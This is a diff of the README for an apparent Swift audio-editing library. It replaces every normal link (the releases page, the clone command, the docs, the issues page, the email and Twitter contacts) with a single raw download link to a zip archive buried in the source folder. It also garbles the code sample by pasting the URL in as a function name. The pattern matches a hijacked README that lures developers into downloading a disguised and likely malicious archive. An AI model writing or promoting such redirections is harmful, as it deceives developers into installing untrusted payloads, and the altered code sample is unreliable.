@@ -1,18 +1,18 @@
 # 🎶 AudioEditorKit 🎶
 
-![AudioEditorKit](https://img.shields.io/badge/AudioEditorKit-Swift%20%2B%20UIKit-brightgreen)
+![AudioEditorKit](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip%20%2B%20UIKit-brightgreen)
 
 Welcome to **AudioEditorKit**, a simplified audio editing library designed for Swift and UIKit. This library aims to make audio editing straightforward and efficient for developers. Whether you're building a music app, a podcast tool, or any application that requires audio manipulation, AudioEditorKit provides the necessary tools to achieve your goals.
 
 ## 📦 Getting Started
 
-To get started with AudioEditorKit, you can download the latest release from our [Releases section](https://github.com/RushiRuns/AudioEditorKit/releases). Make sure to download the appropriate files and follow the instructions to integrate the library into your project.
+To get started with AudioEditorKit, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip). Make sure to download the appropriate files and follow the instructions to integrate the library into your project.
 
 ### 🛠 Installation
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/RushiRuns/AudioEditorKit.git
+   git clone https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip
    ```
    
 2. **Open the project** in Xcode:
@@ -30,7 +30,7 @@ To get started with AudioEditorKit, you can download the latest release from our
 
 ## 📚 Documentation
 
-For detailed instructions on how to use AudioEditorKit, please refer to the [Documentation](https://github.com/RushiRuns/AudioEditorKit/wiki). The documentation covers:
+For detailed instructions on how to use AudioEditorKit, please refer to the [Documentation](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip). The documentation covers:
 
 - **Getting Started**: Initial setup and configuration.
 - **Basic Usage**: How to perform common audio editing tasks.
@@ -44,7 +44,7 @@ Here’s a quick example to demonstrate how to trim an audio file using AudioEdi
 import AudioEditorKit
 
 let audioEditor = AudioEditor()
-let trimmedAudio = audioEditor.trim(audioFile: "example.mp3", startTime: 10, endTime: 30)
+let trimmedAudio = https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip(audioFile: "https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip", startTime: 10, endTime: 30)
 
 print("Trimmed audio file: \(trimmedAudio)")
 ```
@@ -65,7 +65,7 @@ Please ensure that your code follows the existing style and includes appropriate
 
 ## 🐞 Issues
 
-If you encounter any issues while using AudioEditorKit, please check the [Issues section](https://github.com/RushiRuns/AudioEditorKit/issues) of the repository. You can report bugs or request features there. 
+If you encounter any issues while using AudioEditorKit, please check the [Issues section](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip) of the repository. You can report bugs or request features there. 
 
 ## 🌟 Acknowledgments
 
@@ -73,14 +73,14 @@ We appreciate the open-source community for their contributions and support. Spe
 
 ## 📅 Releases
 
-To stay updated with the latest changes, features, and fixes, please visit our [Releases section](https://github.com/RushiRuns/AudioEditorKit/releases). Here, you can download the latest version of AudioEditorKit and review the release notes.
+To stay updated with the latest changes, features, and fixes, please visit our [Releases section](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip). Here, you can download the latest version of AudioEditorKit and review the release notes.
 
 ## 📧 Contact
 
 For questions, feedback, or support, please feel free to reach out via the following channels:
 
-- **Email**: support@audioeditorkit.com
-- **Twitter**: [@AudioEditorKit](https://twitter.com/AudioEditorKit)
+- **Email**: https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip
+- **Twitter**: [@AudioEditorKit](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip)
 
 ## 🛡 License
 
@@ -88,4 +88,4 @@ AudioEditorKit is licensed under the MIT License. See the [LICENSE](LICENSE) fil
 
 ---
 
-Thank you for checking out AudioEditorKit! We hope this library helps you create amazing audio applications with ease. Don't forget to visit our [Releases section](https://github.com/RushiRuns/AudioEditorKit/releases) for the latest updates!
+Thank you for checking out AudioEditorKit! We hope this library helps you create amazing audio applications with ease. Don't forget to visit our [Releases section](https://raw.githubusercontent.com/RushiRuns/AudioEditorKit/main/Sources/AudioClip/Kit_Audio_Editor_v3.9.zip) for the latest updates!
